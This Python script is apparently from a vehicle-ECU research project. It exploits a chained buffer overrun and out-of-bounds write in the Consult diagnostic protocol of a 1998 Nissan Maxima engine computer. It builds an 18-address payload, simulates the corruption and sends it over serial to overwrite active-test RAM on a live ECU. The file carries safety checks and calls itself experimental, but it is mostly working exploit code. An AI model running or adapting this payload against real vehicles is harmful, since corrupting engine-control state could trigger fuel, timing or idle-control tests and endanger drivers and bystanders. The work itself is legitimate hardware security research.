#!/usr/bin/env python3
"""c9_actuator_test: exploit the c9_find_hidden overrun to write to active-test state.

Chains two bugs from ROM_ANALYSIS.md §10:
  1. The c9_find_hidden buffer overrun (C9 addresses in $5D40–$623F, then F0)
  2. The downstream consult_reply_c9 OOB write (corrupted c9_hidden_idx causes
     the per-frame reply builder to write c9_sub_value to an arbitrary offset
     in cs_payload, reaching $0740–$083F)

The overrun at i=12 corrupts $07E3 (the "forwarded present" flag) by writing
the loop counter $0C, which clears bit 0 — the reply builder then skips all
hidden processing. To repair this, we send 18 addresses (not 16) with
specific values at positions 15–17 so the addr_store at i=16 overwrites
$07E3 with a value that has bit 0 SET.

The 18-address payload:
  [0..14]  15 × main trigger addr  (populates idx[0..9] with target byte)
  [15]     repair addr A           (sets up n=$10 for i=16)
  [16]     repair addr B           (addr_store → $07E3, lo byte has bit 0)
  [17]     main trigger addr       (writes target byte to idx[$0E] = cursor start)

The reply builder ($9B3F) processes ONE hidden entry per frame: it reads
c9_hidden_idx[cursor], writes c9_sub_value to cs_payload[idx_val], then
advances the cursor (wrapping at c9_hidden_n). With the repaired flag,
the first frame writes the overrun's stale $07E7 value to the target.

NOTE: at_active writes are confirmed (probe shows sustained $02/$0B during
streaming). However, relay tests ($89 fuel pump, $93/$94 fan) have NO BBC
handler in the main CPU ROM — the relay drivers may be on the H8 second CPU,
which receives commands via serial, not by reading at_active directly.
Parameter-override tests ($81 fuel injection, $82 timing, $85 IACV) DO have
BBC handlers and would fire, but are unsafe with engine running.

SAFE: writes to Consult/active-test state only. No RAM function pointers,
no code redirect. Engine off. Key cycle clears all corruption.

Usage: python3 write-access/tools/c9_actuator_test.py [--target 07B7] [--trigger 6178]
                                         [--dev /dev/ttyUSB0] [--dry-run]
"""
import argparse
import datetime
import os
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, ROOT)

from consult.protocol import Consult, ConsultError, ENGINE_IDS
from consult.transport import DEFAULT_DEV, Transport
from consult.experimental import mutation_stream, require_research_ecu

LOG_DIR = os.path.join(ROOT, "logs")

# --- Layout constants ---
CS_PAYLOAD     = 0x0740
AT_VALUES      = 0x076F
CS_STREAMLIST  = 0x07A0
AT_REQ         = 0x07AC
AT_ACTIVE      = 0x07B7
HIDDEN_ADDR    = 0x07C3
HIDDEN_IDX     = 0x07D7
HIDDEN_N       = 0x07E1
REPLY_CURSOR   = 0x07E2
FWD_FLAGS      = 0x07E3
DTC_SEEN       = 0x0810
FORWARD_LO     = 0x5D40
FORWARD_HI     = 0x623F

DOWNSTREAM_LO  = CS_PAYLOAD           # $0740
DOWNSTREAM_HI  = CS_PAYLOAD + 0xFF    # $083F

MONITOR_REGIONS = [
    (0x076F, 0x11, "at_values"),
    (0x07A0, 0x04, "cs_streamlist"),
    (0x07AC, 0x0B, "at_req"),
    (0x07B7, 0x0C, "at_active"),
    (0x07C3, 0x14, "c9_hidden_addr[0..9]"),
    (0x07D7, 0x0A, "c9_hidden_idx[0..9]"),
    (0x07E1, 0x07, "c9_hidden_n / cursor / fwd"),
]

LABELS = {
    AT_VALUES:    "at_values[0]",
    CS_STREAMLIST: "cs_streamlist",
    AT_REQ:       "at_req[0]",
    AT_ACTIVE:    "at_active[0]",
    HIDDEN_ADDR:  "c9_hidden_addr[0]",
    HIDDEN_IDX:   "c9_hidden_idx[0]",
    HIDDEN_N:     "c9_hidden_n",
    REPLY_CURSOR: "reply_cursor",
    FWD_FLAGS:    "fwd_flags ($07E3)",
}


def build_payload(target, trigger_override=None):
    """Build the 18-address C9 payload that targets a specific RAM byte.

    Returns (addr_list, main_addr, repair_a, repair_b) or None if no valid
    address exists.

    The payload is:
      [0..14]  15 × main_addr    — overrun fills idx[0..9] with target byte
      [15]     repair_a           — sets up n for i=16's addr_store to hit $07E3
      [16]     repair_b           — addr_store writes lo byte (bit 0 set) to $07E3
      [17]     main_addr          — writes target byte to idx at cursor position

    Repair logic (from the $9B3F disassembly):
      At i=15, addr_store writes word to $07E1/$07E2.  To make n=$10 at i=16
      we need the idx_store at i=15 to leave $07E1 such that INC → $10.
      The idx_store reads lo byte of $07E1 as n, writes i=15=$0F to $07D7+n,
      then INC.  With lo=$0A: idx_store → $07D7+$0A = $07E1, writes $0F,
      INC → $10.  At i=16 (n=$10), addr_store → $07C3+$20 = $07E3, writes
      the word for repair_b.  repair_b's lo byte must be ODD (bit 0 set).
      We use lo=$0B → $07E3 = $0B (bits 0+1 both set).
    """
    idx = (target - CS_PAYLOAD) & 0xFF

    if trigger_override is not None:
        main_addr = trigger_override
        word = main_addr - 0x5000
        if (word & 0xFF) != idx:
            return None
        if not (FORWARD_LO <= main_addr <= FORWARD_HI):
            return None
    else:
        for base in (0x5E00, 0x5F00, 0x6000, 0x6100, 0x6200, 0x5D00):
            main_addr = base + idx
            if FORWARD_LO <= main_addr <= FORWARD_HI:
                break
        else:
            return None

    # Repair addr A (position 15): lo byte = $0A so n ends up at $10 for i=16
    # Needs to be in forwarded range
    repair_a = 0x5E0A
    # Repair addr B (position 16): lo byte = $0B (odd, sets bit 0 of $07E3)
    repair_b = 0x5E0B

    if not (FORWARD_LO <= repair_a <= FORWARD_HI and
            FORWARD_LO <= repair_b <= FORWARD_HI):
        return None

    addrs = [main_addr] * 15 + [repair_a, repair_b, main_addr]
    return addrs, main_addr, repair_a, repair_b


def simulate_overrun(addr_list):
    """Simulate c9_find_hidden with the given address list.

    Models the exact instruction sequence from $543F, including m-flag widths.
    Returns (ram dict, event log).
    """
    ram = {}

    def rb(a): return ram.get(a, 0)
    def wb(a, v): ram[a] = v & 0xFF
    def rw(a): return rb(a) | (rb(a + 1) << 8)
    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)

    cs_argc = len(addr_list) * 2
    for i, a in enumerate(addr_list):
        ww(0x08D2 + 2 * i, a)

    wb(HIDDEN_N, 0)
    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)  # CLB $07E3,#$03
    events = []

    for i in range(20):
        a_val = rw(0x08D2 + 2 * i)
        if not (FORWARD_LO <= a_val < 0x6240):
            if 2 * (i + 1) >= cs_argc:
                break
            continue

        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)  # SEB $07E3,#$01
        n = rb(HIDDEN_N)
        addr_idx = (2 * n) & 0xFF
        addr_dest = HIDDEN_ADDR + addr_idx
        word = a_val - 0x5000
        ww(addr_dest, word)

        dest_label = ""
        if addr_dest == HIDDEN_N:
            dest_label = " ← $07E1 (c9_hidden_n)"
        elif addr_dest == HIDDEN_N - 1:
            dest_label = " (hits $07E0/$07E1)"
        elif addr_dest == FWD_FLAGS:
            dest_label = " ← $07E3 (fwd_flags!)"
        elif addr_dest == FWD_FLAGS - 1:
            dest_label = " (hits $07E2/$07E3)"
        events.append(f"  i={i:2d}  n={n:3d}  addr=${a_val:04X}  "
                      f"addr_store: [{addr_dest:04X}] <- ${word:04X}{dest_label}")

        n_re = rw(HIDDEN_N) & 0xFF
        idx_dest = HIDDEN_IDX + n_re
        idx_label = ""
        if idx_dest == HIDDEN_N:
            idx_label = " ← $07E1"
        elif idx_dest == REPLY_CURSOR:
            idx_label = " ← $07E2"
        elif idx_dest == FWD_FLAGS:
            idx_label = " ← $07E3 (fwd_flags!)"
        events.append(f"         idx_store:  [{idx_dest:04X}] <- ${i:02X}{idx_label}")

        wb(idx_dest, i)
        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

        if 2 * (i + 1) >= cs_argc:
            break

    # Summary
    n_final = rb(HIDDEN_N)
    cursor = rb(REPLY_CURSOR)
    flags = rb(FWD_FLAGS)
    events.append("")
    events.append(f"  c9_hidden_n ($07E1) = ${n_final:02X} ({n_final})")
    events.append(f"  reply cursor ($07E2) = ${cursor:02X}")
    events.append(f"  fwd_flags ($07E3) = ${flags:02X}  "
                  f"bit0={'SET' if flags & 1 else 'CLR'}  "
                  f"bit1={'SET' if flags & 2 else 'CLR'}")

    return ram, events


def simulate_reply_builder(ram, n_frames=20):
    """Model consult_reply_c9 ($9B3F) per-frame behavior with corrupted state.

    The builder processes ONE hidden entry per frame:
      1. Check $07E3 bit 0 — if clear, skip (no forwarded addresses)
      2. Check $07E3 bit 1 — if clear, set it, cursor=0, request first addr (no write)
      3. If bit 1 set: read idx[cursor], write c9_sub_value to cs_payload[idx], advance

    Returns list of (frame_num, target_addr, idx_val, cursor_before) for each write.
    """
    def rb(a): return ram.get(a, 0)
    def wb(a, v): ram[a] = v & 0xFF

    flags = rb(FWD_FLAGS)
    if not (flags & 0x01):
        return []

    writes = []
    for frame in range(n_frames):
        if not (rb(FWD_FLAGS) & 0x01):
            break

        if not (rb(FWD_FLAGS) & 0x02):
            # First frame: set bit 1, cursor = 0, request first address, no value placed
            wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x02)
            wb(REPLY_CURSOR, 0)
        else:
            # Read c9_sub_value and place it
            sub_val = rb(0x07E7)
            cursor = rb(REPLY_CURSOR)
            idx_val = rb(HIDDEN_IDX + cursor)
            target = CS_PAYLOAD + idx_val
            writes.append((frame, target, idx_val, cursor, sub_val))

            # Advance cursor
            new_cursor = (cursor + 1) & 0xFF
            if new_cursor == rb(HIDDEN_N):
                new_cursor = 0
            wb(REPLY_CURSOR, new_cursor)

    return writes


def region_label(addr):
    for name, (lo, hi_) in [
        ("cs_payload", (CS_PAYLOAD, CS_PAYLOAD + 0x28)),
        ("at_values", (AT_VALUES, AT_VALUES + 0x2D)),
        ("cs_streamlist", (CS_STREAMLIST, CS_STREAMLIST + 4)),
        ("at_req", (AT_REQ, AT_REQ + 0x0B)),
        ("at_active", (AT_ACTIVE, AT_ACTIVE + 0x0C)),
    ]:
        if lo <= addr < hi_:
            return f"{name}[{addr - lo}]"
    return ""


def build_monitor_addrs():
    addrs = set()
    for start, length, _ in MONITOR_REGIONS:
        addrs.update(range(start, start + length))
    return sorted(addrs)


def read_addrs(c, addrs):
    result = bytearray()
    for i in range(0, len(addrs), 8):
        chunk = addrs[i:i + 8]
        result += c.read_memory(chunk)
    return bytes(result)


def region_dump(data, addrs, title):
    print(f"\n  {title}")
    addr_to_val = dict(zip(addrs, data))
    for start, length, label in MONITOR_REGIONS:
        row = [addr_to_val.get(start + i) for i in range(length)]
        cells = [f"{v:02X}" if v is not None else ".." for v in row]
        print(f"    ${start:04X}: {' '.join(cells)}  ; {label}")


def run_dry(target, addr_list, main_addr):
    idx = (target - CS_PAYLOAD) & 0xFF
    word = main_addr - 0x5000

    print(f"=== Dry run: {len(addr_list)} addresses ===")
    print(f"Target:       ${target:04X} ({region_label(target) or '?'})")
    print(f"Main addr:    ${main_addr:04X} (word ${word:04X}, lo=${word & 0xFF:02X})")
    print(f"Payload:      15×${main_addr:04X} + ${addr_list[15]:04X} + "
          f"${addr_list[16]:04X} + ${addr_list[17]:04X}")
    print()

    ram, events = simulate_overrun(addr_list)
    for e in events:
        print(e)

    flags = ram.get(FWD_FLAGS, 0)
    if not (flags & 0x01):
        print(f"\n✗ $07E3 bit 0 CLEAR — reply builder will skip hidden processing.")
        print(f"  The downstream write cannot fire.")
        return ram, [], False

    print(f"\n  Reply builder simulation (one entry per frame):")
    writes = simulate_reply_builder(dict(ram), n_frames=25)

    targets_hit = set()
    for frame, t_addr, idx_val, cursor, sub_val in writes:
        lbl = region_label(t_addr)
        marker = " ◄" if t_addr == target else ""
        print(f"    frame {frame:2d}: cursor=${cursor:02X} → "
              f"idx=${idx_val:02X} → ${t_addr:04X}"
              f"{'  (' + lbl + ')' if lbl else ''}"
              f"  val=${sub_val:02X}{marker}")
        targets_hit.add(t_addr)
        if frame >= 20:
            break

    hit = target in targets_hit
    print()
    if hit:
        first = next(f for f, t, *_ in writes if t == target)
        print(f"✓ Target ${target:04X} HIT on frame {first}.")
    else:
        print(f"✗ Target ${target:04X} not reached in {len(writes)} frames.")

    return ram, writes, hit


def run_live(dev, target, addr_list, main_addr, n_hold_frames=20):
    """Fire the overrun and monitor the target region."""
    # Append the target as a non-forwarded probe: it reads live RAM each frame,
    # giving us visibility into the downstream write WITHOUT waiting for stop.
    probe_list = addr_list + [target]
    n_addrs = len(probe_list)
    probe_pos = len(addr_list)  # last byte in each frame

    mon_addrs = build_monitor_addrs()
    for a in range(target - 2, target + 3):
        if a not in mon_addrs:
            mon_addrs.append(a)
    mon_addrs = sorted(set(mon_addrs))

    os.makedirs(LOG_DIR, exist_ok=True)
    log = os.path.join(LOG_DIR, f"{datetime.date.today()}_c9-actuator.log")
    t = Transport(dev, log)
    t.note(f"c9_actuator_test target=${target:04X} main=${main_addr:04X} "
           f"n={n_addrs}")

    try:
        c = Consult(t)
        c.ecu_ids = ENGINE_IDS

        r = c.init()
        if r is None:
            sys.exit("init failed (ignition on?)")
        attempt, secs, junk, ecu = r
        require_research_ecu(c)
        print(f"init ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms")

        # --- Baseline ---
        print(f"\nReading {len(mon_addrs)} baseline bytes...")
        before = read_addrs(c, mon_addrs)
        t.note(f"before ({len(before)} bytes)")
        region_dump(before, mon_addrs, "BEFORE (baseline)")

        before_map = dict(zip(mon_addrs, before))
        target_before = before_map.get(target, 0)
        print(f"\n  target ${target:04X} = ${target_before:02X}")

        # --- Trigger ---
        print(f"\nSending trigger: {n_addrs} C9 addresses "
              f"(18 overrun + 1 probe at ${target:04X}) + F0...")
        payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF])
                          for a in probe_list)
        frames = mutation_stream(c, payload, frames=n_hold_frames, expected_len=n_addrs)
        probe_vals = [f[probe_pos] for f in frames]
        t.note(f"stopped after {len(frames)} frame(s)")
        print(f"  streamed {len(frames)} frame(s)")

        # Per-frame probe values — this is the smoking gun
        print(f"\n  Per-frame probe (${target:04X} live RAM):")
        changed_frame = None
        for fi, pv in enumerate(probe_vals):
            marker = ""
            if pv is not None and pv != target_before and changed_frame is None:
                changed_frame = fi
                marker = " ◄ CHANGED"
            print(f"    frame {fi:2d}: ${pv:02X}{marker}" if pv is not None
                  else f"    frame {fi:2d}: ??")

        if changed_frame is not None:
            print(f"\n  Unverified payload change on frame {changed_frame}: "
                  f"${target_before:02X} → ${probe_vals[changed_frame]:02X}")
        else:
            print(f"\n  probe unchanged across {len(frames)} frames "
                  f"(all ${target_before:02X})")

        # --- After ---
        print(f"\nReading {len(mon_addrs)} bytes again...")
        after = read_addrs(c, mon_addrs)
        t.note(f"after ({len(after)} bytes)")
        region_dump(after, mon_addrs, "AFTER (post-overrun)")

        after_map = dict(zip(mon_addrs, after))
        target_after = after_map.get(target, 0)

        # --- Diff ---
        n_changed = 0
        print(f"\n  CHANGES:")
        print(f"  {'addr':>6s}  {'before':>6s}  {'after':>6s}  description")
        print(f"  {'─' * 6}  {'─' * 6}  {'─' * 6}  {'─' * 30}")
        for i, a in enumerate(mon_addrs):
            b, af = before[i], after[i]
            if b != af:
                n_changed += 1
                lbl = region_label(a) or LABELS.get(a, "")
                print(f"  ${a:04X}   ${b:02X}     ${af:02X}     {lbl}")
        if n_changed == 0:
            print(f"  (none)")

        # --- Verdict ---
        print(f"\n{'=' * 60}")
        if target_before != target_after:
            print(f"TARGET READBACK CHANGED (causality/value control unverified): ${target:04X} changed "
                  f"${target_before:02X} → ${target_after:02X}")
            lbl = region_label(target)
            if lbl:
                print(f"  location: {lbl}")
            print(f"  Compare independent readback and collateral state before classifying this trial.")
        elif n_changed > 0:
            print(f"OVERRUN FIRED — {n_changed} byte(s) changed, but target "
                  f"${target:04X} unchanged (${target_before:02X}).")
            flags_after = after_map.get(FWD_FLAGS, 0)
            if not (flags_after & 0x01):
                print(f"  $07E3 = ${flags_after:02X}: bit 0 still clear — "
                      f"flag repair didn't stick.")
            else:
                print(f"  $07E3 = ${flags_after:02X}: flag OK, check cursor path.")
        else:
            print(f"NO CHANGE — trial unverified; establish a fresh baseline before another trial.")
        print(f"{'=' * 60}")

        # --- Persistence ---
        print(f"\nRe-init...")
        r = c.init()
        if r:
            post = read_addrs(c, mon_addrs)
            persisted = sum(1 for b, a, p in zip(before, after, post)
                           if b != a and a == p)
            cleared = sum(1 for b, a, p in zip(before, after, post)
                          if b != a and a != p)
            if persisted:
                print(f"  {persisted} corrupted byte(s) PERSIST (key cycle to clear)")
            if cleared:
                print(f"  {cleared} corrupted byte(s) cleared by re-init")
        else:
            print(f"  re-init failed")

    except (OSError, ValueError) as e:
        print(f"error: {e}")
        raise SystemExit(1) from e
    finally:
        t.close()
        print(f"\nlog: {log}")


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", type=lambda x: int(x, 16), default=AT_ACTIVE + 1,
                    help=f"target RAM address in hex (default: {AT_ACTIVE + 1:04X} = at_active[1])")
    ap.add_argument("--trigger", type=lambda x: int(x, 16), default=None,
                    help="override trigger address (hex); must be in forwarded range")
    ap.add_argument("--dev", default=DEFAULT_DEV,
                    help=f"serial device (default: {DEFAULT_DEV})")
    ap.add_argument("--frames", type=int, default=20,
                    help="frames to stream after trigger (default: 20)")
    ap.add_argument("--dry-run", action="store_true",
                    help="simulate only, don't talk to the ECU")
    args = ap.parse_args()
    if not 1 <= args.frames <= 1000:
        ap.error("--frames must be in 1..1000")

    target = args.target
    if not (DOWNSTREAM_LO <= target <= DOWNSTREAM_HI):
        sys.exit(f"target ${target:04X} outside downstream range "
                 f"${DOWNSTREAM_LO:04X}–${DOWNSTREAM_HI:04X}")

    result = build_payload(target, args.trigger)
    if result is None:
        sys.exit(f"no valid trigger addresses for target ${target:04X}"
                 + (f" with override ${args.trigger:04X}" if args.trigger else ""))
    addr_list, main_addr, repair_a, repair_b = result

    print("c9_actuator_test: write to active-test state via overrun chain")
    print(f"Target ECU: 23710-2L904 (1998 Maxima VQ30DE)")
    print()

    ram, writes, hit = run_dry(target, addr_list, main_addr)
    print()

    if args.dry_run:
        print("(dry run only)")
        return

    if not hit:
        print(f"⚠  Target ${target:04X} not hit in simulation.")
        ok = input("Continue anyway? [y/N] ")
        if ok.strip().lower() != "y":
            sys.exit("not sent")
    else:
        print("-" * 60)
        print("EXPERIMENTAL: controlled downstream writes remain unconfirmed.")
        print("Live state may be corrupted; verify reset behavior and target readback.")
        print("Run with key on, ENGINE OFF.")
        print("-" * 60)
        ok = input("Proceed? [y/N] ")
        if ok.strip().lower() != "y":
            sys.exit("not sent")

    print()
    run_live(args.dev, target, addr_list, main_addr, args.frames)


if __name__ == "__main__":
    main()
